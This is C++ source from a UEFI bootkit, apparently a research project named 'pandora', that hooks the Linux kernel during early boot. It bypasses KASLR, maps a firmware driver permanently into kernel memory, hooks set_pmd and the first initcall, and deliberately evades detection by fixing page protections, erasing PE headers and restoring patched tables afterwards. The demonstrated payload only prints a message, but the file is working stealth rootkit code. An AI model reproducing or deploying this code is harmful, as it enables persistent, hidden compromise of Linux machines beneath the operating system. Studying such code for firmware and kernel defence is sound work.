#include <bootkit/arch/x86/memory.hpp>
#include <bootkit/arch/x86/msr.hpp>
#include <bootkit/arch/x86/rand.hpp>
#include <bootkit/binary/elf.hpp>
#include <bootkit/binary/heuristic.hpp>
#include <bootkit/binary/pe.hpp>
#include <bootkit/debug.hpp>
#include <bootkit/general.hpp>
#include <bootkit/hooking/jmp_hooking.hpp>
#include <bootkit/hooks/bzimage.hpp>
#include <bootkit/hooks/linux.hpp>
#include <bootkit/linux/kallsyms.hpp>
#include <bootkit/linux/vmlinux.hpp>
#include <linux/kern_levels.hpp>

extern "C" {
#include <Base.h>
#include <Library/BaseMemoryLib.h>
}

#define STARTUP_64_HOOK_RETURN_STUB                                                                \
  __asm__ volatile("movq %0, %%rsp\n\t"                                                            \
                   "movq %1, %%rbp\n\t"                                                            \
                   "movq %2, %%r15\n\t"                                                            \
                   "jmp *%3\n\t"                                                                   \
                   :                                                                               \
                   : "m"(hooks::vmlinux::startup_64_original_rsp),                                 \
                     "m"(hooks::vmlinux::startup_64_original_rbp),                                 \
                     "m"(hooks::vmlinux::startup_64_original_r15),                                 \
                     "m"(hooks::vmlinux::kaslr_mov_hook_ctx.from),                                 \
                     "S"(hooks::vmlinux::startup_64_original_rsi),                                 \
                     "a"(hooks::vmlinux::startup_64_original_rax)                                  \
                   : "memory");

static uintptr_t get_new_driver_va(uintptr_t init_scratch_end, uintptr_t stext)
{
  size_t driver_size = ALIGN_VALUE(g::driver_len, EFI_PAGE_SIZE);
  uintptr_t upper_max_base = X86_64_KERNEL_VA_MAX - driver_size;
  uintptr_t upper_min_base = init_scratch_end + EFI_PAGE_SIZE;
  uintptr_t lower_min_base = X86_64_KERNEL_VA_MIN;
  size_t free_space;
  uint64_t random_offset;
  uintptr_t va;

  if (!stext || !init_scratch_end)
    return false;

  // go below
  if (upper_max_base - upper_min_base < driver_size) {
    free_space = pt::unmapped_range_from(lower_min_base);
    if (free_space <= driver_size) {
      // cleanup_highmap would remove any entry in highmap not belonging to
      // kernel overwriting memory is quite fine, if the kernel is not reclaiming
      if (lower_min_base + free_space > stext)
        return 0;

      return lower_min_base;
    }

    free_space -= driver_size;
    random_offset = (rand64() % free_space) & ~UINT64_C(EFI_PAGE_SIZE - 1);
    va = lower_min_base + random_offset;
    return va;
  }

  free_space = upper_max_base - upper_min_base;
  random_offset = (rand64() % free_space) & ~UINT64_C(EFI_PAGE_SIZE - 1);
  va = upper_min_base + random_offset;
  return va;
}

extern "C" void permanent_mapping_setup()
{
  if (!hooks::vmlinux::do_hook_cleanup_highmap()) {
    dbg::serial_print("Failed to hook cleanup_highmap\r\n");
    STARTUP_64_HOOK_RETURN_STUB;
    __builtin_unreachable();
  }

  // thanks to @polyduekes for the initcall hooking idea
  if (!hooks::vmlinux::do_hook_initcalls()) {
    dbg::serial_print("Failed to hook initcalls\r\n");
    STARTUP_64_HOOK_RETURN_STUB;
    __builtin_unreachable();
  }

  STARTUP_64_HOOK_RETURN_STUB;
  __builtin_unreachable();
}

extern "C" void __kaslr_cr3_mov_hook()
{
  uintptr_t original;
  uintptr_t permanent_mapping_setup_addr;
  int64_t displacement_from_base;

  original = hooks::vmlinux::kaslr_mov_hook_ctx.from;
  jmp_unhook(&hooks::vmlinux::kaslr_mov_hook_ctx);

  // NXE has no guarantee of being set at this point, I only discovered that
  // after hours of debugging memory mapping code trying to figure out why
  // reading present pages were page faulting, until I realized NXE bit was off
  // and therefore NX bit in the entries were reserved, thus causing a page fault
  if (!nxe_supported()) {
    dbg::serial_print("NX bit not supported\r\n");
  }
  else {
    nxe_enable(true);
  }

  // early_top_pgt does not contain our driver, so we make an provisory
  // identity-map to load early_top_pgt within our code and not fault (our
  // identity-mapping will die very soon in reset_early_page_tables, so this is
  // not a detection vector by itself)
  // https://elixir.bootlin.com/linux/v6.14.8/source/arch/x86/kernel/head64.c#L280
  dbg::serial_print("Provisionally identity-mapping DXE Driver in kernel early_top_pgt\r\n");
  hooks::vmlinux::early_top_pgt = hooks::vmlinux::startup_64_original_rax;
  if (!pt::map_range_ex(hooks::vmlinux::early_top_pgt, g::driver_pa, g::driver_pa,
                        ALIGN_VALUE(g::driver_len, PS_4K), ENTRY_RW, false)) {
    dbg::serial_print("Failed to identity map DXE Driver in early_top_pgt\r\n");
    STARTUP_64_HOOK_RETURN_STUB;
    __builtin_unreachable();
  }

  // stext is usually the first byte of the vmlinux map range, walk backwards
  vmlinux::base_pa = heuristic::retroactive_find_map_base(original);
  // save EFI cr3 and load early_top_pgt which contains the virtually mapped kernel
  __asm__ volatile("mov %%cr3, %0\n\t"
                   "mov %1, %%cr3"
                   : "=&r"(hooks::vmlinux::efi_pgt)
                   : "r"(hooks::vmlinux::early_top_pgt)
                   : "memory");
  // in order to do everything from a single hook in startup_64, use the indirect jmp
  // Lcommon_startup_64 pointer containing kernel VA for backwards mapping calculation instead of
  // installing an additional hook. if this is not a kernel containing a FF 25 jmp for early_top_pgt
  // VA, bruteforce the start kernel map region in early_top_pgt instead until a mapping is found
  if (hooks::vmlinux::common_startup_64 && pt::is_page_present(*hooks::vmlinux::common_startup_64))
    vmlinux::base = heuristic::retroactive_find_map_base(*hooks::vmlinux::common_startup_64);
  else
    vmlinux::base =
        heuristic::bruteforce_find_vmlinux_base(X86_64_KERNEL_VA_MIN, X86_64_KERNEL_VA_MAX);
  vmlinux::end = heuristic::forward_find_map_end(vmlinux::base);

  // usually, vmlinux base is stext and vmlinux end is etext
  dbg::serial_print("vmlinux base: %Lx\r\n", vmlinux::base);
  dbg::serial_print("vmlinux end: %Lx\r\n", vmlinux::end);
  if (!vmlinux::base || !vmlinux::end) {
    dbg::serial_print("Failed to find either stext or etext\r\n");
    STARTUP_64_HOOK_RETURN_STUB;
    __builtin_unreachable();
  }

  // currently a requirement, do_setup_and_use_brk_pool would fail otherwise and
  // without brk our EFI frame pool would be used instead, which the kernel has
  // no access and would fault in ptdump* functions
  if (!kallsyms::find_layout(vmlinux::base)) {
    dbg::serial_print("Failed to locate kallsyms\r\n");
    STARTUP_64_HOOK_RETURN_STUB;
    __builtin_unreachable();
  }
  if (kallsyms::find_by_name("__init_scratch_end", &vmlinux::__init_scratch_end) !=
      kallsyms::KALLSYMS_SUCCESS) {
    // __init_scratch region is usually at heuristic::forward_find_map_end(_stext)
    // in this context, and the scratch region size is typically 4 MiB. don't map
    // ourselves in there. EDIT: if there is no init_scratch, this is still safe
    // as we can map ourselves below if __init_scratch_end is nonsensical
    vmlinux::__init_scratch_end = vmlinux::end + 0x400000;
    if (vmlinux::__init_scratch_end > X86_64_KERNEL_VA_MAX)
      vmlinux::__init_scratch_end = X86_64_KERNEL_VA_MAX;
  }

  // map using linux kernel brk pool, so kernel code parsing our entries won't
  // page fault as described in my comment about ptdump* functions
  dbg::serial_print("Setting up BRK for permanent reallocation\r\n");
  if (!hooks::vmlinux::do_setup_and_use_brk_pool(vmlinux::base, vmlinux::base_pa,
                                                 hooks::vmlinux::efi_pgt)) {
    dbg::serial_print("Failed to setup and use brk pool\r\n");
    STARTUP_64_HOOK_RETURN_STUB;
    __builtin_unreachable();
  }

  // get an unused space within start kernel range, in pgd 511 for proximity
  // with the kernel using brk pool. cleanup_highmap tries to remove entries
  // not belonging within this range, so to keep this map alive we need to
  // hook set_pmd used by cleanup_highmap. init_top_pgt[511] is copied from
  // early_top_pgt[511], with our soon-to-be mapping included
  // https://elixir.bootlin.com/linux/v6.14.8/source/arch/x86/kernel/head64.c#L492
  g::driver_va = get_new_driver_va(vmlinux::__init_scratch_end, vmlinux::base);
  dbg::serial_print("Mapping DXE Driver to %Lx in early_top_pgt\r\n", g::driver_va);
  if (!pt::map_range(g::driver_va, g::driver_pa, ALIGN_VALUE(g::driver_len, PS_4K),
                     ENTRY_RW | ENTRY_NX, true)) {
    dbg::serial_print("Failed to remap DXE Driver to start kernel range in early_top_pgt\r\n");
    STARTUP_64_HOOK_RETURN_STUB;
    __builtin_unreachable();
  }

  if (!pe::relocate(g::driver_pa, g::driver_va, g::driver_len, hooks::vmlinux::efi_pgt)) {
    dbg::serial_print("Relocate failed\r\n");
    STARTUP_64_HOOK_RETURN_STUB;
    __builtin_unreachable();
  }

  // we're in provisory identity mapped space, calculate displacement to the
  // driver base and jump to it relative to the new virtual address mapping
  displacement_from_base = reinterpret_cast<uintptr_t>(permanent_mapping_setup) - g::driver_pa;
  permanent_mapping_setup_addr = g::driver_va + displacement_from_base;

#if !defined(_PANDORA_DONT_FIX_MANUALLY_MAPPED_DXE_DRIVER_PROT)
  // fix protections to hide from boot time page table walking and W+X mapping
  // detector if we don't, we get pointed out as an odd map in dmesg and the
  // kernel becomes tainted
  // https://elixir.bootlin.com/linux/v7.1.8/source/arch/x86/mm/dump_pagetables.c#L339
  if (!pe::fix_prot(g::driver_va, true))
    dbg::serial_print(
        "Failed to fix protections of manually mapped DXE Driver, kernel will be tainted\r\n");
#endif // !defined(_PANDORA_DONT_FIX_MANUALLY_MAPPED_DXE_DRIVER_PROT)
#if !defined(_PANDORA_DONT_HIDE_MANUALLY_MAPPED_DXE_DRIVER)
  // delete headers and unecessary sections so detecting a manually mapped DXE
  // Runtime Driver in unexpected kernel space memory is harder
  if (!pe::hide(g::driver_va))
    dbg::serial_print("Failed to hide PE image headers and unnecessary sections\r\n");
#endif // !defined(_PANDORA_DONT_HIDE_MANUALLY_MAPPED_DXE_DRIVER)

  dbg::serial_print("Jumping to permanent_mapping_setup at %Lx\r\n", permanent_mapping_setup_addr);
  //__asm__ volatile("jmp *%%rax" ::"a"(permanent_mapping_setup_addr));
  //__builtin_unreachable();
  // the commented way could misalign the stack, do this way instead, the compiler
  // will likely optimize this to a jmp. it is effectively equivalent, but aligning
  // the stack correctly
  return reinterpret_cast<void (*)()>(permanent_mapping_setup_addr)();
}

void NAKED hooks::vmlinux::kaslr_cr3_mov()
{
  // preserve regs that will still be used by startup_64
  __asm__ volatile("movq %%rax, %0\n\t"
                   "movq %%rsp, %1\n\t"
                   "movq %%rbp, %2\n\t"
                   "movq %%rsi, %3\n\t"
                   "movq %%r15, %4\n\t"
                   "jmp %c5"
                   : "=m"(startup_64_original_rax), "=m"(startup_64_original_rsp),
                     "=m"(startup_64_original_rbp), "=m"(startup_64_original_rsi),
                     "=m"(startup_64_original_r15)
                   : "i"(__kaslr_cr3_mov_hook)
                   :);
}

void SYSV_ABI hooks::vmlinux::set_pmd(uintptr_t pmdp, uintptr_t pmdval)
{
  static uintptr_t level2_kernel_pgt;
  uintptr_t driver_va_min;
  uintptr_t driver_va_max;
  size_t driver_len;
  uintptr_t original;
  size_t index;
  uintptr_t va;

  if (!level2_kernel_pgt) {
    if (kallsyms::find_by_name("level2_kernel_pgt", &level2_kernel_pgt) !=
        kallsyms::KALLSYMS_SUCCESS)
      return;
  }

  index = (pmdp - level2_kernel_pgt) / sizeof(pmdval);
  va = X86_64_KERNEL_VA_MIN + index * PS_2M;
  driver_len = ALIGN_VALUE(g::driver_len, PS_4K);
  driver_va_min = g::driver_va & ~(PS_2M - 1);
  driver_va_max = ALIGN_VALUE(g::driver_va + driver_len, PS_2M);
  // no-op to preserve our mappings
  if (va >= driver_va_min && va < driver_va_max) {
    dbg::serial_print("No-op'd set_pmd targetting %Lx containing our driver\r\n", va);
    // done, unhook
    if (va + PS_2M >= driver_va_max)
      jmp_unhook(&set_pmd_ctx);

    return;
  }
  // unhook at last chance of unhooking if it didn't try to unmap us
  if (va >= X86_64_KERNEL_VA_MAX - PS_2M) {
    jmp_unhook(&set_pmd_ctx);
    return;
  }

  // we are single threaded at this point, so this is safe (although ugly)
  original = set_pmd_ctx.from;
  jmp_unhook(&set_pmd_ctx);
  reinterpret_cast<decltype(&set_pmd)>(original)(pmdp, pmdval);
  jmp_hook(original, reinterpret_cast<uintptr_t>(set_pmd), &set_pmd_ctx);

  return;
}

int SYSV_ABI hooks::vmlinux::first_initcall_hook()
{
  int ret;

  if (kallsyms::find_by_name("_printk", reinterpret_cast<uintptr_t *>(&::vmlinux::printk)) !=
      kallsyms::KALLSYMS_SUCCESS) {
    kallsyms::find_by_name("printk", reinterpret_cast<uintptr_t *>(&::vmlinux::printk));
  }

  if (::vmlinux::printk)
    ::vmlinux::printk(KERN_INFO "pandora was here :)\n");

  ret = reinterpret_cast<::vmlinux::initcall_t>(original_first_initcall)();
  // it won't be used again, but restore to appear nothing ever happened
  if (::vmlinux::config_have_arch_prel32_relocations) {
    int32_t original_disp32;
    original_disp32 = static_cast<int32_t>(static_cast<intptr_t>(original_first_initcall) -
                                           static_cast<intptr_t>(first_initcall_table));
    *reinterpret_cast<int32_t *>(first_initcall_table) = original_disp32;
  }
  else {
    *reinterpret_cast<uintptr_t *>(first_initcall_table) = original_first_initcall;
  }

  return ret;
}

bool hooks::vmlinux::do_hook_cleanup_highmap()
{
  uintptr_t cleanup_highmap;
  uintptr_t target_set_pmd;
  kallsyms::kallsyms_err_t ret;

  ret = kallsyms::find_by_name("cleanup_highmap", &cleanup_highmap,
                               kallsyms::KALLSYMS_QUERY_FOR_CODE);
  if (ret != kallsyms::KALLSYMS_SUCCESS) {
    dbg::serial_print("Could not find cleanup_highmap\r\n");
    return false;
  }

  target_set_pmd = heuristic::find_set_pmd_used_by_cleanup_highmap(cleanup_highmap);
  if (target_set_pmd == 0) {
    dbg::serial_print("Could not find set_pmd used by cleanup_highmap\r\n");
    return false;
  }

  dbg::serial_print("Hooking set_pmd used by cleanup_highmap at %Lx\r\n", target_set_pmd);
  if (!jmp_hook(target_set_pmd, reinterpret_cast<uintptr_t>(set_pmd), &set_pmd_ctx)) {
    dbg::serial_print("Failed to hook set_pmd at %Lx\r\n", cleanup_highmap);
    return false;
  }

  return true;
}

bool hooks::vmlinux::do_hook_initcalls()
{
  char initcall_name[18] = "__initcall7_start";
  uintptr_t __initcall_start[8];
  uintptr_t __initcall_end;
  size_t len;
  kallsyms::kallsyms_err_t ret;
  int first_level;
  uint8_t found_bitmask;
  bool prel32_relocations;

  ret = kallsyms::find_by_name("__initcall_end", &__initcall_end);
  if (ret != kallsyms::KALLSYMS_SUCCESS) {
    dbg::serial_print("Could not find __initcall_end\r\n");
    return false;
  }
  found_bitmask = 0;
  prel32_relocations = false;
  for (int i = 7; i >= 0; i--) {
    ret = kallsyms::find_by_name(initcall_name, &__initcall_start[i]);
    if (ret != kallsyms::KALLSYMS_SUCCESS) {
      // current initcall level digit is at index 10 of the string
      initcall_name[10] -= 1;
      continue;
    }

    found_bitmask |= 1 << i;
    // if highest level, subtract from __initcall_end
    if (i == 7 || (found_bitmask == (1 << i))) {
      len = __initcall_end - __initcall_start[i];
      // if its an array of absolute addresses, remainder cannot be 0
      // this detects CONFIG_HAVE_ARCH_PREL32_RELOCATIONS heuristically
      // https://elixir.bootlin.com/linux/v7.1.8/source/include/linux/init.h#L112
      if ((len % sizeof(uintptr_t)) != 0) {
        prel32_relocations = true;
      }
    }
    else if (found_bitmask & (1 << (i + 1))) {
      len = __initcall_start[i + 1] - __initcall_start[i];
      if ((len % sizeof(uintptr_t)) != 0) {
        prel32_relocations = true;
      }
    }

    initcall_name[10] -= 1;
  }

  if (found_bitmask == 0)
    return false;

  // the number of trailing zeros in bitmask represents the first level found
  first_level = __builtin_ctz(found_bitmask);
  if (!prel32_relocations) {
    size_t range_mapped;
    len = __initcall_end - __initcall_start[first_level];
    range_mapped = pt::mapped_range_from(__initcall_start[first_level]);
    if (range_mapped < len)
      len = range_mapped;

    if (len < sizeof(uintptr_t))
      return false;

    for (size_t i = 0; i < len; i += sizeof(uintptr_t)) {
      uintptr_t current = *reinterpret_cast<uintptr_t *>(__initcall_start[first_level] + i);
      // an array of absolute addresses cannot have entries to invalid memory. if any fails,
      // this must be a CONFIG_HAVE_ARCH_PREL32_RELOCATIONS kernel
      if (!pt::is_page_present(current)) {
        prel32_relocations = true;
        break;
      }
    }
  }

  ::vmlinux::config_have_arch_prel32_relocations = prel32_relocations;
  first_initcall_table = __initcall_start[first_level];
  if (prel32_relocations) {
    int32_t rel32;
    int32_t hook_rel32;

    // https://elixir.bootlin.com/linux/v7.1.8/source/include/linux/init.h#L117
    // https://elixir.bootlin.com/linux/v7.1.8/source/include/linux/compiler.h#L258
    rel32 = *reinterpret_cast<int32_t *>(__initcall_start[first_level]);
    original_first_initcall = __initcall_start[first_level] + rel32;
    hook_rel32 = static_cast<int32_t>(reinterpret_cast<intptr_t>(first_initcall_hook) -
                                      static_cast<intptr_t>(first_initcall_table));
    *reinterpret_cast<int32_t *>(__initcall_start[first_level]) = hook_rel32;
  }
  else {
    // https://elixir.bootlin.com/linux/v7.1.8/source/include/linux/init.h#L124
    original_first_initcall = *reinterpret_cast<uintptr_t *>(__initcall_start[first_level]);
    *reinterpret_cast<uintptr_t *>(__initcall_start[first_level]) =
        reinterpret_cast<uintptr_t>(first_initcall_hook);
  }

  return true;
}

bool hooks::vmlinux::do_setup_and_use_brk_pool(uintptr_t stext_va, uintptr_t stext_pa,
                                               uintptr_t efi_page_tables)
{
  pt::kernel_managed_pool::kernel_brk brk = {};
  uintptr_t brk_pool_pa_start;
  uintptr_t brk_pool_size;
  uint64_t saved_cr3;

  if (!kallsyms::kallsyms_available()) {
    dbg::serial_print("Could not find brk pool as kallsyms is not available\r\n");
    return false;
  }

  if (kallsyms::find_by_name("_brk_end", reinterpret_cast<uintptr_t *>(&brk.brk_end)) !=
      kallsyms::KALLSYMS_SUCCESS) {
    dbg::serial_print("Could not find _brk_end\r\n");
    return false;
  }

  if (kallsyms::find_by_name("__brk_limit", &brk.brk_limit) != kallsyms::KALLSYMS_SUCCESS) {
    dbg::serial_print("Could not find __brk_limit\r\n");
    return false;
  }

  brk_pool_pa_start = *brk.brk_end - stext_va + stext_pa;
  brk_pool_size = brk.brk_limit - *brk.brk_end;
  __asm__ volatile("mov %%cr3, %0\n\t"
                   "mov %1, %%cr3"
                   : "=&r"(saved_cr3)
                   : "r"(efi_page_tables)
                   : "memory");
  // identity map brk pool pa
  if (!pt::map_range_ex(early_top_pgt, brk_pool_pa_start, brk_pool_pa_start, brk_pool_size,
                        ENTRY_RW | ENTRY_NX, false)) {
    dbg::serial_print("Failed to identity map managed pool\r\n");
  }
  __asm__ volatile("mov %0, %%cr3\n\t" ::"r"(saved_cr3) : "memory");

  if (!pt::kernel_managed_pool::init_pool(&brk)) {
    dbg::serial_print("Failed to init kernel managed pool\r\n");
    return false;
  }

  g::state |= KERNEL_MANAGED_FRAME_POOL_AVAILABLE;
  return true;
}